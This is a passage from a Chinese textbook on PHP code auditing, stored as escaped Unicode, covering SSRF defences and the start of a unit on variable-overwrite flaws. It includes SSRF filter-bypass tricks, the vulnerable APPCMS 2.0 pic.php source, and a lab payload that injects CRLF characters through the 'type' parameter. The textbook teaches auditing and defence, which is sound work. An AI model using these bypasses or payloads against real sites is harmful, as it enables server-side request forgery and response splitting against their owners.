\u5C06\u70B9\u201C.\u201D\u66FF\u6362\u4E3A\u53E5\u53F7\u201C\u3002\u201D\u7ED5\u8FC7\u6B63\u5219\u8868\u8FBE\u5F0F\uFF1A127\u30020\u30020\u30021\u5C06\u8BA4\u5B9A\u4E3A127.0.0.1\uFF1B\r
\r
\u4E3AIP\u5730\u5740\u6DFB\u52A0\u7AEF\u53E3\u53F7\u7ED5\u8FC7\u6B63\u5219\u8868\u8FBE\u5F0F\uFF1A127.0.0.1:80\u3002\r
\r
## 9.8 SSRF\u6F0F\u6D1E\u9632\u5FA1\r
\r
SSRF\u6F0F\u6D1E\u9632\u5FA1\u7684\u4E3B\u8981\u95EE\u9898\u5728\u4E8E\u7F51\u7AD9\u8BBF\u95EE\u5916\u90E8\u8D44\u6E90\u662F\u5426\u8FC7\u6EE4\u4E25\u683C\uFF0C\u4E0B\u9762\u7ED9\u51FASSRF\u6F0F\u6D1E\u9632\u5FA1\u5EFA\u8BAE\uFF1A\r
\r
\uFF081\uFF09\u8FC7\u6EE4\u7F51\u7AD9\u8BBF\u95EE\u5916\u90E8\u8D44\u6E90\u7684\u8FD4\u56DE\u4FE1\u606F\uFF0C\u9A8C\u8BC1\u8FDC\u7A0B\u670D\u52A1\u5668\u5BF9\u8BF7\u6C42\u7684\u54CD\u5E94\u3002\u5982\u679CWeb\u5E94\u7528\u83B7\u53D6\u67D0\u4E00\u79CD\u7C7B\u578B\u7684\u6587\u4EF6\uFF0C\u90A3\u4E48\u5728\u8FD4\u56DE\u7ED3\u679C\u5C55\u793A\u7ED9\u7528\u6237\u4E4B\u524D\u5148\u9A8C\u8BC1\u8FD4\u56DE\u7684\u4FE1\u606F\u662F\u5426\u7B26\u5408\u6807\u51C6\u3002\r
\r
\uFF082\uFF09\u7EDF\u4E00\u9519\u8BEF\u4FE1\u606F\uFF0C\u907F\u514D\u7528\u6237\u53EF\u4EE5\u6839\u636E\u9519\u8BEF\u4FE1\u606F\u6765\u5224\u65AD\u8FDC\u7A0B\u670D\u52A1\u5668\u7684\u7AEF\u53E3\u72B6\u6001\uFF0C\u4ECE\u800C\u9632\u5FA1SSRF\u6F0F\u6D1E\u5BFC\u81F4\u7684\u4FE1\u606F\u6CC4\u9732\u3002\r
\r
\uFF083\uFF09\u9650\u5236\u8BF7\u6C42\u7684\u7AEF\u53E3\u4E3Ahttp\u5E38\u7528\u7684\u7AEF\u53E3\uFF0C\u4F8B\u5982\uFF1A80\u3001443\u30018080\u30018090\u7B49\u3002\r
\r
\uFF084\uFF09\u7F51\u7AD9\u8BBF\u95EE\u5185\u7F51\u8D44\u6E90\u65F6\uFF0C\u8981\u8BBE\u7F6E\u9ED1\u540D\u5355\u5185\u7F51IP\u8FC7\u6EE4\uFF0C\u907F\u514D\u91C7\u7528\u88AB\u7528\u6765\u83B7\u53D6\u5185\u7F51\u6570\u636E\u4ECE\u800C\u653B\u51FB\u5185\u7F51\u3002\r
\r
\uFF085\uFF09\u7981\u7528\u4E0D\u5FC5\u8981\u7684\u534F\u8BAE\uFF0C\u4F8B\u5982\uFF1Afile://\u3001ftp://\u3001gopher://\u7B49\u3002\u4EC5\u5141\u8BB8\u4F7F\u7528http\u6216https\u8BF7\u6C42\u3002\r
\r
## 9.9 SSRF\u5BA1\u8BA1CMS\u5B9E\u8DF5\r
\r
### 9.9.1  \u5B9E\u9A8C\uFF1AAPPCMS2.0 SSRF\u5BA1\u8BA1\r
\r
\xB7 \u5B9E\u9A8C\u4ECB\u7ECD\r
\r
\u672C\u5B9E\u9A8C\u5C06\u5BF9APPCMS V2.0\u7248\u672C\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u4F5C\uFF0C\u5BA1\u8BA1\u8BE5CMS\u4E2D\u662F\u5426\u5B58\u5728SSRF\u6F0F\u6D1E\u3002\r
\r
\xB7 \u9884\u5907\u77E5\u8BC6\r
\r
\u53C2\u80039.5\u8282\uFF1ASSRF\u6F0F\u6D1E\u6316\u6398\uFF1B9.6\u8282\uFF1ASSRF\u6F0F\u6D1E\u5206\u7C7B\u3002\r
\r
\xB7 \u5B9E\u9A8C\u76EE\u7684\r
\r
\u638C\u63E1SSRF\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\xB7 \u5B9E\u9A8C\u73AF\u5883\r
\r
Windows\u64CD\u4F5C\u7CFB\u7EDF\u4E3B\u673A\uFF1BAPPCMS 2.0\u5B89\u88C5\u5305\uFF1BPhpStorm\u5DE5\u5177\u3002\r
\r
\xB7 \u5B9E\u9A8C\u6B65\u9AA4\r
\r
\uFF081\uFF09\u5BA1\u8BA1\u9636\u6BB5\r
\r
\u5BF9APPCMS\u8FDB\u884CSSRF\u6F0F\u6D1E\u5BA1\u8BA1\uFF0C\u5168\u5C40\u641C\u7D22\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u3002\u4F7F\u7528Seay\u4EE3\u7801\u5BA1\u8BA1\u5DE5\u5177\u5BF9\u8BE5\u7F51\u7AD9\u6E90\u7801\u8FDB\u884C\u626B\u63CF\uFF0C\u626B\u63CF\u53D1\u73B0/pic.php\u6587\u4EF6\u4E2D\u7684readfile\u51FD\u6570\u53EF\u80FD\u5B58\u5728\u6F0F\u6D1E\uFF08\u8BE5\u626B\u63CF\u5DE5\u5177\u5C06\u5176\u79F0\u4E3A\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\uFF0C\u4F46\u5B9E\u9645\u4E0A\u6B64\u5904\u4E3ASSRF\u6F0F\u6D1E\uFF09\uFF0C\u5982\u88689-1\u6240\u793A\u3002\u56E0\u6B64\uFF0C\u5BF9\u8BE5\u6587\u4EF6\u4EE3\u7801\u8FDB\u884C\u5BA1\u8BA1\r
\r
\u88689-1 seay\u626B\u63CF\u7ED3\u679C\r
\r
| 7    | \u8BFB\u53D6\u6587\u4EF6\u51FD\u6570\u4E2D\u5B58\u5728\u53D8\u91CF\uFF0C\u53EF\u80FD\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E | /pic.php | readfile($img_url); |\r
| ---- | ------------------------------------------------ | -------- | ------------------- |\r
|      |                                                  |          |                     |\r
\r
/pic.php\u6587\u4EF6\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
<?php\r
\r
if(isset($_GET['url']) && trim($_GET['url']) != '' && isset($_GET['type'])) {\r
\r
  $img_url=trim($_GET['url']);   //\u53BB\u6389\u7A7A\u767D\u5B57\u7B26\r
\r
  $img_url = base64_decode($img_url);   //\u628Aurl\u53C2\u6570\u505Abase64\u89E3\u7801\u3001\u8BF4\u660E\u4F20\u5165\u65F6\u662Fbase64\u7F16\u7801\u7684\r
\r
  $img_url=strtolower(trim($img_url));   //\u628Aimg_url\u8F6C\u5316\u4E3A\u5C0F\u5199\r
\r
  $_GET['type']=strtolower(trim($_GET['type']));   //\u628Atype\u8F6C\u4E3A\u5C0F\u5199\r
\r
  $urls=explode('.',$img_url);   //\u4F7F\u7528.\u5206\u5272img_url\uFF0C\u5982\u679C\u662F1.png\r
\r
  if(count($urls)<=1) die('image type forbidden 0');  //\u5982\u679Curls\u6570\u7EC4\u5C0F\u4E8E\u6216\u8005\u7B49\u4E8E1\uFF0C\u5219\u7EC8\u6B62\u8F93\u51FAimage type forbidden 0\r
\r
  $file_type=$urls[count($urls)-1];   //\u53D6\u5F97\u6570\u7EC4\u5012\u6570\u7B2C\u4E00\u4E2A\u503C\uFF0C\u83B7\u53D6\u6587\u4EF6\u7C7B\u578B\r
\r
  if(in_array($file_type,array('jpg','gif','png','jpeg'))){}else{ die('image type foridden 1');} //\u5224\u65AD\u56FE\u7247\u7C7B\u578B\u662F\u4E0D\u662F\u2019jpg\u2019,\u2019gif\u2019,\u2019png\u2019,\u2019jpeg\u2019\u8FD9\u51E0\u79CD\uFF0C\u5982\u679C\u662F\u7684\u8BDD\u4EC0\u4E48\u90FD\u4E0D\u505A\uFF0C\u5982\u679C\u4E0D\u662F\u7684\u8BDD\u5219\u8F93\u51FA image type foridden 1\r
\r
  if(strstr($img_url,'php')) die('image type forbidden 2'); //\u9632\u62A4\u89E3\u6790\u6F0F\u6D1E\r
\r
  if(strstr($img_url,chr(0)))die('image type forbidden 3'); //\u5224\u65AD\u7A7A\u5B57\u7B26\u622A\u65AD\r
\r
  if(strlen($img_url)>256)die('url too length forbidden 4'); //\u5224\u65AD\u4E86url\u957F\u5EA6\u4E0D\u80FD\u5927\u4E8E256\r
\r
  header("Content-Type: image/{$_GET['type']}"); //\u8FD9\u91CC\u662F\u91CD\u70B9\uFF0Ctype\u662F\u54CD\u5E94\u7C7B\u578B\uFF0C\u8FD9\u4E2A\u53C2\u6570\u662F\u53EF\u63A7\u7684\r
\r
  readfile($img_url); //\u5F00\u59CB\u8BFB\u6587\u4EF6\r
\r
} else {\r
\r
  die('image not find\uFF01');\r
\r
}?>\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u4F7F\u7528HTTP\u7684GET\u65B9\u5F0F\u4F20\u9012\u53C2\u6570url\u548C\u53C2\u6570type\uFF1B\r
\r
l \u5BF9\u53C2\u6570url\u8FDB\u884C\u9632\u62A4\u5904\u7406\uFF0C\u5305\u62EC\uFF1A\u9996\u5C3E\u53BB\u7A7A\u683C\u3001base64\u89E3\u7801\u3001\u8F6C\u6362\u4E3A\u5C0F\u5199\uFF1B\r
\r
l \u5BF9\u53C2\u6570url\u4F20\u9012\u7684\u6587\u4EF6\u540D\u79F0\u6309\u7167\u70B9\u201C.\u201D\u8FDB\u884C\u5206\u9694\uFF0C\u53D6\u5F97\u70B9\u53F7\u540E\u7684\u6587\u4EF6\u7C7B\u578B\uFF0C\u5224\u65AD\u662F\u5426\u5728\u767D\u540D\u5355\u4E2D('jpg','gif','png','jpeg')\u3002\r
\r
l \u53C2\u6570url\u4E2D\u4E0D\u5141\u8BB8\u5B58\u5728\u5173\u952E\u5B57\u201Cphp\u201D\u3001\u5B57\u7B26\u201C0\u201D\u3001\u957F\u5EA6\u5C0F\u4E8E\u7B49\u4E8E256\u3002\r
\r
l \u5BF9\u53C2\u6570type\u8FDB\u884C\u9996\u5C3E\u53BB\u7A7A\u5E76\u8F6C\u6362\u4E3A\u5C0F\u5199\uFF0C\u5C06\u5176\u4F5C\u4E3AHTTP\u5934\u4E2D\u7684Content-type\u3002\r
\r
l \u8C03\u7528readfile\u51FD\u6570\u8BFB\u53D6url\u6587\u4EF6\u3002\r
\r
\u82E5\u53C2\u6570url\u53EF\u63A7\uFF0C\u540C\u65F6\u7ED5\u8FC7\u4E0A\u8FF0\u9632\u62A4\uFF0C\u5373\u53EF\u63A7\u5236readfile\u51FD\u6570\u8BFB\u53D6\u9875\u9762\u6587\u4EF6\u3002\r
\r
\uFF082\uFF09SSRF\u6F0F\u6D1E\u5229\u7528\r
\r
\u4F7F\u7528\u8BE5\u6F0F\u6D1E\u8DF3\u8F6C\u5230\u767E\u5EA6\u7F51\u7AD9\uFF0C\u5C06\u8DF3\u8F6C\u7F51\u7AD9\u201Chttp://www.baidu.com/?1.png\u201D\u8FDB\u884Cbase64\u7F16\u7801\u4E3A\u201CaHR0cDovL3d3dy5iYWlkdS5jb20vPzEucG5n\u201D\u3002\u7136\u540E\uFF0C\u6784\u9020\u8BE5\u7F51\u7AD9\u7684Payload\u4E3A\u201Chttp://127.0.0.1/appcms/pic.php?url=aHR0cDovL3d3dy5iYWlkdS5jb20vPzEucG5n&type=png%0A%0Dtest\u201D\u3002\r
\r
\u5176\u4E2Durl\u53C2\u6570\u7684\u503C\u4E3A\u4E0A\u8FF0base64\u7F16\u7801\u540E\u7ED3\u679C\uFF0Ctype\u53C2\u6570\u4E3A\u201Cpng%0A%0Dtest\u201D\uFF0C 0A%0D\u5206\u522B\u662F\u6362\u884C\u7B26\u548C\u56DE\u8F66\u7B26\u7684URL\u7F16\u7801\u540E\u7ED3\u679C\uFF0C\u6B64\u65B9\u5F0F\u4E5F\u79F0\u4E3ACRLF\u6CE8\u5165\u6F0F\u6D1E\uFF08CRLF\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u662F\u56E0\u4E3AWeb\u5E94\u7528\u6CA1\u6709\u5BF9\u7528\u6237\u8F93\u5165\u505A\u4E25\u683C\u9A8C\u8BC1\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u53EF\u4EE5\u8F93\u5165\u4E00\u4E9B\u6076\u610F\u5B57\u7B26\u3002\u653B\u51FB\u8005\u4E00\u65E6\u5411\u8BF7\u6C42\u884C\u6216\u9996\u90E8\u4E2D\u7684\u5B57\u6BB5\u6CE8\u5165\u6076\u610F\u7684CRLF\uFF0C\u5C31\u80FD\u6CE8\u5165\u4E00\u4E9B\u9996\u90E8\u5B57\u6BB5\u6216\u62A5\u6587\u4E3B\u4F53\uFF0C\u5E76\u5728\u54CD\u5E94\u4E2D\u8F93\u51FA\uFF0C\u6240\u4EE5\u53C8\u79F0\u4E3AHTTP\u54CD\u5E94\u62C6\u5206\u6F0F\u6D1E\uFF09\u3002\u4E0A\u8FF0Payload\u6267\u884C\u540E\uFF0C\u7ED3\u679C\u5982\u56FE9-7\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image476.jpg)\r
\r
\u56FE9-7 APPCMS SSRF\u6F0F\u6D1E\u5229\u7528\u56FE\r
\r
## 9.10 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684XXE\u4E0ESSRF\u5B89\u5168\u95EE\u9898\uFF0C\u901A\u8FC7\u7ECF\u5178\u4EE3\u7801\u6848\u4F8B\uFF0C\u5BF9\u8FD9\u4E9B\u6F0F\u6D1E\u7684\u4EE3\u7801\u3001\u5206\u7C7B\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5BA1\u8BA1XXE\u4E0ESSRF\u6F0F\u6D1E\u3002\u4E0E\u6B64\u540C\u65F6\uFF0C\u7ED9\u51FA\u5B58\u5728\u6F0F\u6D1E\u7684CMS\u5BA1\u8BA1\u6D41\u7A0B\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u514310 \u53D8\u91CF\u8986\u76D6\u4E0E\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u3001\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u5BA1\u8BA1\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u4E09\u90E8\u5206\u8FDB\u884C\u4ECB\u7ECD\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4ECB\u7ECD\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1A\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u57FA\u672C\u6982\u5FF5\u3001\u6F0F\u6D1E\u5BA1\u8BA1\u65B9\u6CD5\u3001\u6F0F\u6D1E\u9632\u5FA1\u65B9\u6CD5\u7B49\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4ECB\u7ECD\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u6848\u4F8B\uFF0C\u5305\u62EC\uFF1Aextract\u51FD\u6570\u3001parse_str\u51FD\u6570\u3001import_request_variables\u51FD\u6570\u3001\u5168\u5C40\u53D8\u91CF\u8986\u76D6\u3001$$\u53D8\u91CF\u8986\u76D6\u3002\u901A\u8FC7\u7ED9\u51FAPHP\u6F0F\u6D1E\u4EE3\u7801\uFF0C\u8BA9\u8BFB\u8005\u4E86\u89E3\u6F0F\u6D1E\u4EE3\u7801\u6848\u4F8B\uFF0C\u5E76\u4F7F\u7528phpcms2008\u8FDB\u884C\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u5BA1\u8BA1\u5B9E\u8DF5\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECDPHP\u4E2D\u5E8F\u5217\u5316\u4E0E\u53CD\u5E8F\u5217\u5316\u529F\u80FD\uFF0C\u901A\u8FC7\u4EE3\u7801\u6848\u4F8B\u4E86\u89E3\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image478.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1.  \u4E86\u89E3\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u539F\u7406\u3001\u6316\u6398\u6280\u5DE7\uFF1B\r
\r
\\2.  \u638C\u63E1\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u5E38\u89C1\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\3.  \u638C\u63E1\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u9632\u5FA1\u65B9\u6CD5\uFF1B\r
\r
\\4.  \u7406\u89E3\u53CD\u5E8F\u5217\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
## 10.1 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u6316\u6398\r
\r
### 10.1.1 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7B80\u4ECB\r
\r
\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u662F\u6307\u653B\u51FB\u8005\u4F7F\u7528\u81EA\u5B9A\u4E49\u7684\u53D8\u91CF\u53BB\u8986\u76D6\u6E90\u4EE3\u7801\u4E2D\u7684\u53D8\u91CF\uFF0C\u4ECE\u800C\u6539\u53D8\u4EE3\u7801\u903B\u8F91\uFF0C\u5B9E\u73B0\u653B\u51FB\u76EE\u7684\u7684\u4E00\u79CD\u6F0F\u6D1E\u3002\u901A\u5E38\u6765\u8BF4\uFF0C\u5355\u72EC\u7684\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u5F88\u96BE\u6709\u5229\u7528\u4EF7\u503C\uFF0C\u56E0\u6B64\u8BE5\u6F0F\u6D1E\u901A\u5E38\u8981\u4E0E\u7A0B\u5E8F\u4E2D\u7684\u5176\u4ED6\u529F\u80FD\u8FDB\u884C\u7ED3\u5408\u6765\u5B9E\u73B0\u5B8C\u6574\u653B\u51FB\uFF0C\u5176\u9020\u6210\u7684\u5371\u5BB3\u53EF\u80FD\u662F\u65E0\u6CD5\u4F30\u91CF\u7684\u3002\u4F8B\u5982\uFF1A\u67D0\u7F51\u7AD9\u4E2D\u7684\u8D2D\u4E70\u5546\u54C1\u652F\u4ED8\u7CFB\u7EDF\u82E5\u5B58\u5728\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\uFF0C\u5219\u53EF\u80FD\u5BFC\u81F40\u5143\u652F\u4ED8\u4E0B\u5355\u7684\u60C5\u51B5\u3002\u67D0\u7F51\u7AD9\u4E2D\u7684\u4E0A\u4F20\u6587\u4EF6\u529F\u80FD\u82E5\u5B58\u5728\u8BE5\u6F0F\u6D1E\uFF0C\u5219\u53EF\u80FD\u5BFC\u81F4\u4EFB\u610F\u6269\u5C55\u540D\u8986\u76D6\u4E0A\u4F20\u767D\u540D\u5355\u5217\u8868\uFF0C\u8986\u76D6PHP\u7684\u6269\u5C55\u540D\u5E76\u4E0A\u4F20\u6076\u610FPHP\u811A\u672C\u3002\r
\r
\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u4E3B\u8981\u7531\u4E24\u7C7B\u4EA7\u751F\u60C5\u51B5\uFF1A\u51FD\u6570\u4F7F\u7528\u4E0D\u5F53\u3001$$\u53EF\u53D8\u53D8\u91CF\u8986\u76D6\u539F\u6709\u53D8\u91CF\u3002\r
\r
l \u51FD\u6570\u4F7F\u7528\u4E0D\u5F53\r
\r
\u5F15\u53D1\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u51FD\u6570\u5305\u62EC\uFF1Aextract()\u3001import_request_variables()\u3001parse_str()\u3001\u5F00\u542F\u5168\u5C40\u53D8\u91CF\u6CE8\u518Cregister_globals=On\uFF08PHP5.4\u4E4B\u540E\u6B63\u5F0F\u79FB\u9664\u6B64\u529F\u80FD\uFF09\u7B49\u3002\r
\r
l $$\u53EF\u53D8\u53D8\u91CF\u8986\u76D6\u539F\u6709\u53D8\u91CF\r
\r
\u4F7F\u7528$$\u65B9\u5F0F\u6CE8\u518C\u53D8\u91CF\u8FC7\u7A0B\u4E2D\uFF0C\u7531\u4E8E\u672A\u5BF9\u6CE8\u518C\u53D8\u91CF\u540D\u79F0\u8FDB\u884C\u9A8C\u8BC1\uFF0C\u4ECE\u800C\u5BFC\u81F4\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u3002\r
\r
### 10.1.2 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u5BA1\u8BA1\u7ECF\u9A8C\r
\r
\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u901A\u5E38\u4F1A\u7ED3\u5408Web\u5E94\u7528\u7684\u5176\u4ED6\u529F\u80FD\u4EE3\u7801\u5B9E\u73B0\u5B8C\u6574\u7684\u653B\u51FB\u6D41\u7A0B\uFF0C\u4F8B\u5982\uFF1A\u4EE3\u7801\u6267\u884C\u3001\u547D\u4EE4\u6267\u884C\u3001\u903B\u8F91\u7ED5\u8FC7\u7B49\u6F0F\u6D1E\u3002\u53EF\u7528\u7684\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u9700\u8981\u8003\u8651\u4E24\u4E2A\u65B9\u9762\uFF1A\u6316\u6398\u548C\u5229\u7528\u3002\u540C\u65F6\uFF0C\u5B58\u5728\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u53D8\u91CF\u4E00\u5B9A\u8981\u5BA1\u8BA1\u8BE5\u53D8\u91CF\u4F7F\u7528\u524D\u540E\u7684\u8C03\u7528\u60C5\u51B5\uFF0C\u624D\u80FD\u5145\u5206\u6316\u6398\u4E0E\u5229\u7528\u3002\r
\r
\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u5BA1\u8BA1\u5305\u62EC\u5982\u4E0B\u65B9\u6CD5\uFF1A\r
\r
l \u5BF9\u4E8E\u51FD\u6570extract()\u4E0Eparse_str()\u800C\u8A00\uFF0C\u4F7F\u7528\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u6CD5\u5BA1\u8BA1\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u662F\u5426\u53EF\u63A7\u3002\r
\r
l \u5BF9\u4E8E\u51FD\u6570import_request_variables()\u800C\u8A00\uFF0C\u5176\u76F8\u5F53\u4E8E\u5F00\u542F\u4E86\u5168\u5C40\u53D8\u91CF\u6CE8\u518C\u3002\u9700\u8981\u5BA1\u8BA1\u7A0B\u5E8F\u4E2D\u6CA1\u6709\u521D\u59CB\u5316\u5E76\u64CD\u4F5C\u4E4B\u524D\u6CA1\u6709\u8D4B\u503C\u7684\u53D8\u91CF\uFF08PHP4\u81F34.1.0\u548CPHP5\u81F35.4.0\u7248\u672C\u53EF\u7528\uFF09\u3002\r
\r
l \u5BF9\u4E8E$$\u800C\u8A00\uFF0C\u53EF\u4EE5\u901A\u8FC7\u641C\u7D22\u5173\u952E\u5B57\u201C$$\u201D\uFF0C\u6316\u6398\u7A0B\u5E8F\u6F0F\u6D1E\u3002\u540C\u65F6\uFF0C\u53EF\u5BF9\u7A0B\u5E8F\u4E2D\u51E0\u4E2A\u6838\u5FC3\u6587\u4EF6\u901A\u8BFB\u4E00\u904D\u5E76\u4E86\u89E3\u7A0B\u5E8F\u6846\u67B6\u3002\r
\r
### 10.1.3 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u9632\u5FA1\u7B56\u7565\u4E3B\u8981\u5305\u62EC\u4EE5\u4E0B\u4E24\u70B9\uFF1A\r
\r
l \u4E3A\u53D8\u91CF\u8D4B\u503C\u65F6\u4F7F\u7528\u539F\u59CB\u7684\u53D8\u91CF\u6570\u7EC4\uFF1B\r
\r
l \u8BE5\u6F0F\u6D1E\u5728\u505A\u53D8\u91CF\u6CE8\u518C\u65F6\u672A\u9A8C\u8BC1\u53D8\u91CF\u662F\u5426\u5B58\u5728\u3002\r
\r
\uFF081\uFF09\u4F7F\u7528\u539F\u59CB\u53D8\u91CF\u6570\u7EC4\r
\r
\u5728\u8FDB\u884C\u7A0B\u5E8F\u8BBE\u8BA1\u5F00\u53D1\u65F6\uFF0C\u5C3D\u91CF\u4E0D\u4F7F\u7528\u6CE8\u518C\u53D8\u91CF\uFF0C\u5E76\u76F4\u63A5\u4F7F\u7528\u539F\u751F\u7684$_GET\u3001$_POST\u7B49\u6570\u7EC4\u53D8\u91CF\u8FDB\u884C\u64CD\u4F5C\uFF0C\u5982\u679C\u8003\u8651\u7A0B\u5E8F\u53EF\u8BFB\u6027\u7B49\u539F\u56E0\uFF0C\u9700\u8981\u6CE8\u518C\u4E2A\u522B\u53D8\u91CF\uFF0C\u53EF\u4EE5\u76F4\u63A5\u5728\u4EE3\u7801\u4E2D\u5B9A\u4E49\u53D8\u91CF\uFF0C\u7136\u540E\u518D\u628A\u8BF7\u6C42\u4E2D\u7684\u503C\u8D4B\u503C\u7ED9\u5B83\u3002\r
\r
\uFF082\uFF09\u9A8C\u8BC1\u53D8\u91CF\u662F\u5426\u5B58\u5728\r
\r
\u4E3A\u4E86\u89E3\u51B3\u53D8\u91CF\u8986\u76D6\u7684\u95EE\u9898\uFF0C\u9700\u8981\u5728\u6CE8\u518C\u53D8\u91CF\u524D\u5224\u65AD\u53D8\u91CF\u662F\u5426\u5B58\u5728\uFF0C\u9700\u8981\u6CE8\u610F\u4EE5\u4E0B\u4E09\u70B9\uFF1A\r
\r
l \u4F7F\u7528extract()\u51FD\u6570\u5219\u53EF\u914D\u7F6E\u7B2C\u4E8C\u4E2A\u53C2\u6570\u4E3AEXTR_SKIP\u3002\u5982\uFF1Aextract(x,EXTR_SKIP)\u3002\r
\r
l \u4F7F\u7528parse_str()\u51FD\u6570\u6CE8\u518C\u53D8\u91CF\u524D\u9700\u8981\u5148\u81EA\u884C\u901A\u8FC7\u4EE3\u7801\u5224\u65AD\u53D8\u91CF\u662F\u5426\u5B58\u5728\u3002\r
\r
l \u81EA\u5B9A\u4E49\u7684\u53D8\u91CF\u4E00\u5B9A\u8981\u521D\u59CB\u5316\uFF0C\u4E0D\u7136\u5373\u4F7F\u6CE8\u518C\u53D8\u91CF\u4EE3\u7801\u5728\u6267\u884C\u6D41\u7A0B\u6700\u524D\u9762\u4E5F\u80FD\u8986\u76D6\u6389\u8FD9\u4E9B\u672A\u521D\u59CB\u5316\u7684\u53D8\u91CF\u3002\r
\r
## 10.2 \u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u6848\u4F8B\r
\r
  \u672C\u5C0F\u8282\u5C06\u5F15\u8D77\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\u7684\u5E38\u89C1\u51FD\u6570\u53CA\u65B9\u5F0F\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u5305\u62EC\uFF1Aextract()\u3001import_request_variables()\u3001parse_str()\u3001\u5F00\u542F\u5168\u5C40\u53D8\u91CF\u6CE8\u518C\u3001$$\u3002\r
\r
### 10.2.1 extract\u51FD\u6570\u4F7F\u7528\u4E0D\u5F53\r
\r
extract()\u51FD\u6570\u7684\u7528\u6CD5\u662F\u4ECE\u6570\u7EC4\u4E2D\u5C06\u53D8\u91CF\u5BFC\u5165\u5230\u5F53\u524D\u7684\u7B26\u53F7\u8868\u3002\u8BE5\u51FD\u6570\u4F7F\u7528\u6570\u7EC4\u952E\u540D\u4F5C\u4E3A\u53D8\u91CF\u540D\uFF0C\u4F7F\u7528\u6570\u7EC4\u952E\u503C\u4F5C\u4E3A\u53D8\u91CF\u503C\u3002\u9488\u5BF9\u6570\u7EC4\u4E2D\u7684\u6BCF\u4E2A\u5143\u7D20\uFF0C\u5C06\u5728\u5F53\u524D\u7B26\u53F7\u8868\u4E2D\u521B\u5EFA\u5BF9\u5E94\u7684\u4E00\u4E2A\u53D8\u91CF\u5E76\u8FD4\u56DE\u8BBE\u7F6E\u7684\u53D8\u91CF\u6570\u76EE\u3002extract\u51FD\u6570\u7ED3\u6784\u5982\u4E0B\uFF1A\r
\r
extract(array,extract_rules,prefix)\r
\r
l array\uFF1A\u89C4\u5B9A\u8981\u4F7F\u7528\u7684\u6570\u7EC4\uFF1B\r
\r
l extract_rules\uFF1A\u68C0\u67E5\u6BCF\u4E2A\u952E\u540D\u662F\u5426\u5408\u6CD5\uFF0C\u540C\u65F6\u68C0\u67E5\u548C\u7B26\u53F7\u8868\u4E2D\u5DF2\u5B58\u5728\u7684\u53D8\u91CF\u540D\u662F\u5426\u51B2\u7A81\u5E76\u8FDB\u884C\u5904\u7406\uFF1B\r
\r
